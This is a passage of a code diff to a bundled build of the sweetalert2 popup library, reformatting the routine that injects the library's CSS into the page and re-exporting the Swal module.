button:where(.swal2-close){grid-column:3/3;grid-row:1/99;align-self:center;width:.8em;height:.8em;margin:0;font-size:2em}.swal2-toast div:where(.swal2-html-container){margin:.5em 1em;padding:0;overflow:initial;font-size:1em;text-align:initial}.swal2-toast div:where(.swal2-html-container):empty{padding:0}.swal2-toast .swal2-loader{grid-column:1;grid-row:1/99;align-self:center;width:2em;height:2em;margin:.25em}.swal2-toast .swal2-icon{grid-column:1;grid-row:1/99;align-self:center;width:2em;min-width:2em;height:2em;margin:0 .5em 0 0}.swal2-toast .swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:1.8em;font-weight:bold}.swal2-toast .swal2-icon.swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line]{top:.875em;width:1.375em}.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:.3125em}.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:.3125em}.swal2-toast div:where(.swal2-actions){justify-content:flex-start;height:auto;margin:0;margin-top:.5em;padding:0 .5em}.swal2-toast button:where(.swal2-styled){margin:.25em .5em;padding:.4em .6em;font-size:1em}.swal2-toast .swal2-success{border-color:#a5dc86}.swal2-toast .swal2-success [class^=swal2-success-circular-line]{position:absolute;width:1.6em;height:3em;border-radius:50%}.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.8em;left:-0.5em;transform:rotate(-45deg);transform-origin:2em 2em;border-radius:4em 0 0 4em}.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.25em;left:.9375em;transform-origin:0 1.5em;border-radius:0 4em 4em 0}.swal2-toast .swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-toast .swal2-success .swal2-success-fix{top:0;left:.4375em;width:.4375em;height:2.6875em}.swal2-toast .swal2-success [class^=swal2-success-line]{height:.3125em}.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip]{top:1.125em;left:.1875em;width:.75em}.swal2-toast .swal2-success [class^=swal2-success-line][class$=long]{top:.9375em;right:.1875em;width:1.375em}.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-toast-animate-success-line-tip .75s}.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-toast-animate-success-line-long .75s}.swal2-toast.swal2-show{animation:swal2-toast-show .5s}.swal2-toast.swal2-hide{animation:swal2-toast-hide .1s forwards}@keyframes swal2-show{0%{transform:scale(0.7)}45%{transform:scale(1.05)}80%{transform:scale(0.95)}100%{transform:scale(1)}}@keyframes swal2-hide{0%{transform:scale(1);opacity:1}100%{transform:scale(0.5);opacity:0}}@keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-0.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(0.4);opacity:0}50%{margin-top:1.625em;transform:scale(0.4);opacity:0}80%{margin-top:-0.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0deg);opacity:1}}@keyframes swal2-rotate-loading{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}@keyframes swal2-animate-question-mark{0%{transform:rotateY(-360deg)}100%{transform:rotateY(0)}}@keyframes swal2-animate-i-mark{0%{transform:rotateZ(45deg);opacity:0}25%{transform:rotateZ(-25deg);opacity:.4}50%{transform:rotateZ(15deg);opacity:.8}75%{transform:rotateZ(-5deg);opacity:1}100%{transform:rotateX(0);opacity:1}}@keyframes swal2-toast-show{0%{transform:translateY(-0.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(0.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0deg)}}@keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-0.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@keyframes swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}'
-  );
-export { Swal as default };
+"undefined" != typeof document && function(e, t) {
+  var n = e.createElement("style");
+  if (e.getElementsByTagName("head")[0].appendChild(n), n.styleSheet) n.styleSheet.disabled || (n.styleSheet.cssText = t);
+  else try {
+    n.innerHTML = t;
+  } catch (e2) {
+    n.innerText = t;
+  }
+}(document, 'body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown){overflow:hidden}body.swal2-height-auto{height:auto !important}body.swal2-no-backdrop .swal2-container{background-color:rgba(0,0,0,0) !important;pointer-events:none}body.swal2-no-backdrop .swal2-container .swal2-popup{pointer-events:all}body.swal2-no-backdrop .swal2-container .swal2-modal{box-shadow:0 0 10px rgba(0,0,0,.4)}body.swal2-toast-shown .swal2-container{box-sizing:border-box;width:360px;max-width:100%;background-color:rgba(0,0,0,0);pointer-events:none}body.swal2-toast-shown .swal2-container.swal2-top{inset:0 auto auto 50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-top-end,body.swal2-toast-shown .swal2-container.swal2-top-right{inset:0 0 auto auto}body.swal2-toast-shown .swal2-container.swal2-top-start,body.swal2-toast-shown .swal2-container.swal2-top-left{inset:0 auto auto 0}body.swal2-toast-shown .swal2-container.swal2-center-start,body.swal2-toast-shown .swal2-container.swal2-center-left{inset:50% auto auto 0;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-center{inset:50% auto auto 50%;transform:translate(-50%, -50%)}body.swal2-toast-shown .swal2-container.swal2-center-end,body.swal2-toast-shown .swal2-container.swal2-center-right{inset:50% 0 auto auto;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-start,body.swal2-toast-shown .swal2-container.swal2-bottom-left{inset:auto auto 0 0}body.swal2-toast-shown .swal2-container.swal2-bottom{inset:auto auto 0 50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-end,body.swal2-toast-shown .swal2-container.swal2-bottom-right{inset:auto 0 0 auto}@media print{body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown){overflow-y:scroll !important}body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown)>[aria-hidden=true]{display:none}body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown) .swal2-container{position:static !important}}div:where(.swal2-container){display:grid;position:fixed;z-index:1060;inset:0;box-sizing:border-box;grid-template-areas:"top-start     top            top-end" "center-start  center         center-end" "bottom-start  bottom-center  bottom-end";grid-template-rows:minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);height:100%;padding:.625em;overflow-x:hidden;transition:background-color .1s;-webkit-overflow-scrolling:touch}div:where(.swal2-container).swal2-backdrop-show,div:where(.swal2-container).swal2-noanimation{background:rgba(0,0,0,.4)}div:where(.swal2-container).swal2-backdrop-hide{background:rgba(0,0,0,0) !important}div:where(.swal2-container).swal2-top-start,div:where(.swal2-container).swal2-center-start,div:where(.swal2-container).swal2-bottom-start{grid-template-columns:minmax(0, 1fr) auto auto}div:where(.swal2-container).swal2-top,div:where(.swal2-container).swal2-center,div:where(.swal2-container).swal2-bottom{grid-template-columns:auto minmax(0, 1fr) auto}div:where(.swal2-container).swal2-top-end,div:where(.swal2-container).swal2-center-end,div:where(.swal2-container).swal2-bottom-end{grid-template-columns:auto auto minmax(0, 1fr)}div:where(.swal2-container).swal2-top-start>.swal2-popup{align-self:start}div:where(.swal2-container).swal2-top>.swal2-popup{grid-column:2;place-self:start center}div:where(.swal2-container).swal2-top-end>.swal2-popup,div:where(.swal2-container).swal2-top-right>.swal2-popup{grid-column:3;place-self:start end}div:where(.swal2-container).swal2-center-start>.swal2-popup,div:where(.swal2-container).swal2-center-left>.swal2-popup{grid-row:2;align-self:center}div:where(.swal2-container).swal2-center>.swal2-popup{grid-column:2;grid-row:2;place-self:center center}div:where(.swal2-container).swal2-center-end>.swal2-popup,div:where(.swal2-container).swal2-center-right>.swal2-popup{grid-column:3;grid-row:2;place-self:center end}div:where(.swal2-container).swal2-bottom-start>.swal2-popup,div:where(.swal2-container).swal2-bottom-left>.swal2-popup{grid-column:1;grid-row:3;align-self:end}div:where(.swal2-container).swal2-bottom>.swal2-popup{grid-column:2;grid-row:3;place-self:end center}div:where(.swal2-container).swal2-bottom-end>.swal2-popup,div:where(.swal2-container).swal2-bottom-right>.swal2-popup{grid-column:3;grid-row:3;place-self:end end}div:where(.swal2-container).swal2-grow-row>.swal2-popup,div:where(.swal2-container).swal2-grow-fullscreen>.swal2-popup{grid-column:1/4;width:100%}div:where(.swal2-container).swal2-grow-column>.swal2-popup,div:where(.swal2-container).swal2-grow-fullscreen>.swal2-popup{grid-row:1/4;align-self:stretch}div:where(.swal2-container).swal2-no-transition{transition:none !important}div:where(.swal2-container) div:where(.swal2-popup){display:none;position:relative;box-sizing:border-box;grid-template-columns:minmax(0, 100%);width:32em;max-width:100%;padding:0 0 1.25em;border:none;border-radius:5px;background:#fff;color:#545454;font-family:inherit;font-size:1rem}div:where(.swal2-container) div:where(.swal2-popup):focus{outline:none}div:where(.swal2-container) div:where(.swal2-popup).swal2-loading{overflow-y:hidden}div:where(.swal2-container) div:where(.swal2-popup).swal2-draggable{cursor:grab}div:where(.swal2-container) div:where(.swal2-popup).swal2-draggable div:where(.swal2-icon){cursor:grab}div:where(.swal2-container) div:where(.swal2-popup).swal2-dragging{cursor:grabbing}div:where(.swal2-container) div:where(.swal2-popup).swal2-dragging div:where(.swal2-icon){cursor:grabbing}div:where(.swal2-container) h2:where(.swal2-title){position:relative;max-width:100%;margin:0;padding:.8em 1em 0;color:inherit;font-size:1.875em;font-weight:600;text-align:center;text-transform:none;word-wrap:break-word;cursor:initial}div:where(.swal2-container) div:where(.swal2-actions){display:flex;z-index:1;box-sizing:border-box;flex-wrap:wrap;align-items:center;justify-content:center;width:auto;margin:1.25em auto 0;padding:0}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled[disabled]{opacity:.4}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled:hover{background-image:linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1))}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled:active{background-image:linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2))}div:where(.swal2-container) div:where(.swal2-loader){display:none;align-items:center;justify-content:center;width:2.2em;height:2.2em;margin:0 1.875em;animation:swal2-rotate-loading 1.5s linear 0s infinite normal;border-width:.25em;border-style:solid;border-radius:100%;border-color:#2778c4 rgba(0,0,0,0) #2778c4 rgba(0,0,0,0)}div:where(.swal2-container) button:where(.swal2-styled){margin:.3125em;padding:.625em 1.1em;transition:box-shadow .1s;box-shadow:0 0 0 3px rgba(0,0,0,0);font-weight:500}div:where(.swal2-container) button:where(.swal2-styled):not([disabled]){cursor:pointer}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-confirm){border:0;border-radius:.25em;background:initial;background-color:#7066e0;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-confirm):focus-visible{box-shadow:0 0 0 3px rgba(112,102,224,.5)}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-deny){border:0;border-radius:.25em;background:initial;background-color:#dc3741;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-deny):focus-visible{box-shadow:0 0 0 3px rgba(220,55,65,.5)}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-cancel){border:0;border-radius:.25em;background:initial;background-color:#6e7881;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-cancel):focus-visible{box-shadow:0 0 0 3px rgba(110,120,129,.5)}div:where(.swal2-container) button:where(.swal2-styled).swal2-default-outline:focus-visible{box-shadow:0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) button:where(.swal2-styled):focus-visible{outline:none}div:where(.swal2-container) button:where(.swal2-styled)::-moz-focus-inner{border:0}div:where(.swal2-container) div:where(.swal2-footer){margin:1em 0 0;padding:1em 1em 0;border-top:1px solid #eee;color:inherit;font-size:1em;text-align:center;cursor:initial}div:where(.swal2-container) .swal2-timer-progress-bar-container{position:absolute;right:0;bottom:0;left:0;grid-column:auto !important;overflow:hidden;border-bottom-right-radius:5px;border-bottom-left-radius:5px}div:where(.swal2-container) div:where(.swal2-timer-progress-bar){width:100%;height:.25em;background:rgba(0,0,0,.2)}div:where(.swal2-container) img:where(.swal2-image){max-width:100%;margin:2em auto 1em;cursor:initial}div:where(.swal2-container) button:where(.swal2-close){z-index:2;align-items:center;justify-content:center;width:1.2em;height:1.2em;margin-top:0;margin-right:0;margin-bottom:-1.2em;padding:0;overflow:hidden;transition:color .1s,box-shadow .1s;border:none;border-radius:5px;background:rgba(0,0,0,0);color:#ccc;font-family:monospace;font-size:2.5em;cursor:pointer;justify-self:end}div:where(.swal2-container) button:where(.swal2-close):hover{transform:none;background:rgba(0,0,0,0);color:#f27474}div:where(.swal2-container) button:where(.swal2-close):focus-visible{outline:none;box-shadow:inset 0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) button:where(.swal2-close)::-moz-focus-inner{border:0}div:where(.swal2-container) div:where(.swal2-html-container){z-index:1;justify-content:center;margin:0;padding:1em 1.6em .3em;overflow:auto;color:inherit;font-size:1.125em;font-weight:normal;line-height:normal;text-align:center;word-wrap:break-word;word-break:break-word;cursor:initial}div:where(.swal2-container) input:where(.swal2-input),div:where(.swal2-container) input:where(.swal2-file),div:where(.swal2-container) textarea:where(.swal2-textarea),div:where(.swal2-container) select:where(.swal2-select),div:where(.swal2-container) div:where(.swal2-radio),div:where(.swal2-container) label:where(.swal2-checkbox){margin:1em 2em 3px}div:where(.swal2-container) input:where(.swal2-input),div:where(.swal2-container) input:where(.swal2-file),div:where(.swal2-container) textarea:where(.swal2-textarea){box-sizing:border-box;width:auto;transition:border-color .1s,box-shadow .1s;border:1px solid #d9d9d9;border-radius:.1875em;background:rgba(0,0,0,0);box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(0,0,0,0);color:inherit;font-size:1.125em}div:where(.swal2-container) input:where(.swal2-input).swal2-inputerror,div:where(.swal2-container) input:where(.swal2-file).swal2-inputerror,div:where(.swal2-container) textarea:where(.swal2-textarea).swal2-inputerror{border-color:#f27474 !important;box-shadow:0 0 2px #f27474 !important}div:where(.swal2-container) input:where(.swal2-input):focus,div:where(.swal2-container) input:where(.swal2-file):focus,div:where(.swal2-container) textarea:where(.swal2-textarea):focus{border:1px solid #b4dbed;outline:none;box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) input:where(.swal2-input)::placeholder,div:where(.swal2-container) input:where(.swal2-file)::placeholder,div:where(.swal2-container) textarea:where(.swal2-textarea)::placeholder{color:#ccc}div:where(.swal2-container) .swal2-range{margin:1em 2em 3px;background:#fff}div:where(.swal2-container) .swal2-range input{width:80%}div:where(.swal2-container) .swal2-range output{width:20%;color:inherit;font-weight:600;text-align:center}div:where(.swal2-container) .swal2-range input,div:where(.swal2-container) .swal2-range output{height:2.625em;padding:0;font-size:1.125em;line-height:2.625em}div:where(.swal2-container) .swal2-input{height:2.625em;padding:0 .75em}div:where(.swal2-container) .swal2-file{width:75%;margin-right:auto;margin-left:auto;background:rgba(0,0,0,0);font-size:1.125em}div:where(.swal2-container) .swal2-textarea{height:6.75em;padding:.75em}div:where(.swal2-container) .swal2-select{min-width:50%;max-width:100%;padding:.375em .625em;background:rgba(0,0,0,0);color:inherit;font-size:1.125em}div:where(.swal2-container) .swal2-radio,div:where(.swal2-container) .swal2-checkbox{align-items:center;justify-content:center;background:#fff;color:inherit}div:where(.swal2-container) .swal2-radio label,div:where(.swal2-container) .swal2-checkbox label{margin:0 .6em;font-size:1.125em}div:where(.swal2-container) .swal2-radio input,div:where(.swal2-container) .swal2-checkbox input{flex-shrink:0;margin:0 .4em}div:where(.swal2-container) label:where(.swal2-input-label){display:flex;justify-content:center;margin:1em auto 0}div:where(.swal2-container) div:where(.swal2-validation-message){align-items:center;justify-content:center;margin:1em 0 0;padding:.625em;overflow:hidden;background:#f0f0f0;color:#666;font-size:1em;font-weight:300}div:where(.swal2-container) div:where(.swal2-validation-message)::before{content:"!";display:inline-block;width:1.5em;min-width:1.5em;height:1.5em;margin:0 .625em;border-radius:50%;background-color:#f27474;color:#fff;font-weight:600;line-height:1.5em;text-align:center}div:where(.swal2-container) .swal2-progress-steps{flex-wrap:wrap;align-items:center;max-width:100%;margin:1.25em auto;padding:0;background:rgba(0,0,0,0);font-weight:600}div:where(.swal2-container) .swal2-progress-steps li{display:inline-block;position:relative}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step{z-index:20;flex-shrink:0;width:2em;height:2em;border-radius:2em;background:#2778c4;color:#fff;line-height:2em;text-align:center}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step{background:#2778c4}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step{background:#add8e6;color:#fff}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line{background:#add8e6}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step-line{z-index:10;flex-shrink:0;width:2.5em;height:.4em;margin:0 -1px;background:#2778c4}div:where(.swal2-icon){position:relative;box-sizing:content-box;justify-content:center;width:5em;height:5em;margin:2.5em auto .6em;border:.25em solid rgba(0,0,0,0);border-radius:50%;border-color:#000;font-family:inherit;line-height:5em;cursor:default;user-select:none}div:where(.swal2-icon) .swal2-icon-content{display:flex;align-items:center;font-size:3.75em}div:where(.swal2-icon).swal2-error{border-color:#f27474;color:#f27474}div:where(.swal2-icon).swal2-error .swal2-x-mark{position:relative;flex-grow:1}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line]{display:block;position:absolute;top:2.3125em;width:2.9375em;height:.3125em;border-radius:.125em;background-color:#f27474}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line][class$=left]{left:1.0625em;transform:rotate(45deg)}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line][class$=right]{right:1em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-error.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-error.swal2-icon-show .swal2-x-mark{animation:swal2-animate-error-x-mark .5s}div:where(.swal2-icon).swal2-warning{border-color:#f8bb86;color:#f8bb86}div:where(.swal2-icon).swal2-warning.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-warning.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .5s}div:where(.swal2-icon).swal2-info{border-color:#3fc3ee;color:#3fc3ee}div:where(.swal2-icon).swal2-info.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-info.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .8s}div:where(.swal2-icon).swal2-question{border-color:#87adbd;color:#87adbd}div:where(.swal2-icon).swal2-question.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-question.swal2-icon-show .swal2-icon-content{animation:swal2-animate-question-mark .8s}div:where(.swal2-icon).swal2-success{border-color:#a5dc86;color:#a5dc86}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line]{position:absolute;width:3.75em;height:7.5em;border-radius:50%}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.4375em;left:-2.0635em;transform:rotate(-45deg);transform-origin:3.75em 3.75em;border-radius:7.5em 0 0 7.5em}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.6875em;left:1.875em;transform:rotate(-45deg);transform-origin:0 3.75em;border-radius:0 7.5em 7.5em 0}div:where(.swal2-icon).swal2-success .swal2-success-ring{position:absolute;z-index:2;top:-0.25em;left:-0.25em;box-sizing:content-box;width:100%;height:100%;border:.25em solid rgba(165,220,134,.3);border-radius:50%}div:where(.swal2-icon).swal2-success .swal2-success-fix{position:absolute;z-index:1;top:.5em;left:1.625em;width:.4375em;height:5.625em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-success [class^=swal2-success-line]{display:block;position:absolute;z-index:2;height:.3125em;border-radius:.125em;background-color:#a5dc86}div:where(.swal2-icon).swal2-success [class^=swal2-success-line][class$=tip]{top:2.875em;left:.8125em;width:1.5625em;transform:rotate(45deg)}div:where(.swal2-icon).swal2-success [class^=swal2-success-line][class$=long]{top:2.375em;right:.5em;width:2.9375em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-animate-success-line-tip .75s}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-animate-success-line-long .75s}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-circular-line-right{animation:swal2-rotate-success-circular-line 4.25s ease-in}[class^=swal2]{-webkit-tap-highlight-color:rgba(0,0,0,0)}.swal2-show{animation:swal2-show .3s}.swal2-hide{animation:swal2-hide .15s forwards}.swal2-noanimation{transition:none}.swal2-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}.swal2-rtl .swal2-close{margin-right:initial;margin-left:0}.swal2-rtl .swal2-timer-progress-bar{right:0;left:auto}.swal2-toast{box-sizing:border-box;grid-column:1/4 !important;grid-row:1/4 !important;grid-template-columns:min-content auto min-content;padding:1em;overflow-y:hidden;background:#fff;box-shadow:0 0 1px rgba(0,0,0,.075),0 1px 2px rgba(0,0,0,.075),1px 2px 4px rgba(0,0,0,.075),1px 3px 8px rgba(0,0,0,.075),2px 4px 16px rgba(0,0,0,.075);pointer-events:all}.swal2-toast>*{grid-column:2}.swal2-toast h2:where(.swal2-title){margin:.5em 1em;padding:0;font-size:1em;text-align:initial}.swal2-toast .swal2-loading{justify-content:center}.swal2-toast input:where(.swal2-input){height:2em;margin:.5em;font-size:1em}.swal2-toast .swal2-validation-message{font-size:1em}.swal2-toast div:where(.swal2-footer){margin:.5em 0 0;padding:.5em 0 0;font-size:.8em}.swal2-toast button:where(.swal2-close){grid-column:3/3;grid-row:1/99;align-self:center;width:.8em;height:.8em;margin:0;font-size:2em}.swal2-toast div:where(.swal2-html-container){margin:.5em 1em;padding:0;overflow:initial;font-size:1em;text-align:initial}.swal2-toast div:where(.swal2-html-container):empty{padding:0}.swal2-toast .swal2-loader{grid-column:1;grid-row:1/99;align-self:center;width:2em;height:2em;margin:.25em}.swal2-toast .swal2-icon{grid-column:1;grid-row:1/99;align-self:center;width:2em;min-width:2em;height:2em;margin:0 .5em 0 0}.swal2-toast .swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:1.8em;font-weight:bold}.swal2-toast .swal2-icon.swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line]{top:.875em;width:1.375em}.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:.3125em}.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:.3125em}.swal2-toast div:where(.swal2-actions){justify-content:flex-start;height:auto;margin:0;margin-top:.5em;padding:0 .5em}.swal2-toast button:where(.swal2-styled){margin:.25em .5em;padding:.4em .6em;font-size:1em}.swal2-toast .swal2-success{border-color:#a5dc86}.swal2-toast .swal2-success [class^=swal2-success-circular-line]{position:absolute;width:1.6em;height:3em;border-radius:50%}.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.8em;left:-0.5em;transform:rotate(-45deg);transform-origin:2em 2em;border-radius:4em 0 0 4em}.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.25em;left:.9375em;transform-origin:0 1.5em;border-radius:0 4em 4em 0}.swal2-toast .swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-toast .swal2-success .swal2-success-fix{top:0;left:.4375em;width:.4375em;height:2.6875em}.swal2-toast .swal2-success [class^=swal2-success-line]{height:.3125em}.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip]{top:1.125em;left:.1875em;width:.75em}.swal2-toast .swal2-success [class^=swal2-success-line][class$=long]{top:.9375em;right:.1875em;width:1.375em}.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-toast-animate-success-line-tip .75s}.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-toast-animate-success-line-long .75s}.swal2-toast.swal2-show{animation:swal2-toast-show .5s}.swal2-toast.swal2-hide{animation:swal2-toast-hide .1s forwards}@keyframes swal2-show{0%{transform:scale(0.7)}45%{transform:scale(1.05)}80%{transform:scale(0.95)}100%{transform:scale(1)}}@keyframes swal2-hide{0%{transform:scale(1);opacity:1}100%{transform:scale(0.5);opacity:0}}@keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-0.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(0.4);opacity:0}50%{margin-top:1.625em;transform:scale(0.4);opacity:0}80%{margin-top:-0.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0deg);opacity:1}}@keyframes swal2-rotate-loading{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}@keyframes swal2-animate-question-mark{0%{transform:rotateY(-360deg)}100%{transform:rotateY(0)}}@keyframes swal2-animate-i-mark{0%{transform:rotateZ(45deg);opacity:0}25%{transform:rotateZ(-25deg);opacity:.4}50%{transform:rotateZ(15deg);opacity:.8}75%{transform:rotateZ(-5deg);opacity:1}100%{transform:rotateX(0);opacity:1}}@keyframes swal2-toast-show{0%{transform:translateY(-0.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(0.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0deg)}}@keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-0.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@keyframes swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}');
+export {
+  Swal as default
+};
 /*! Bundled license information:
 
 sweetalert2/dist/sweetalert2.esm.all.js:
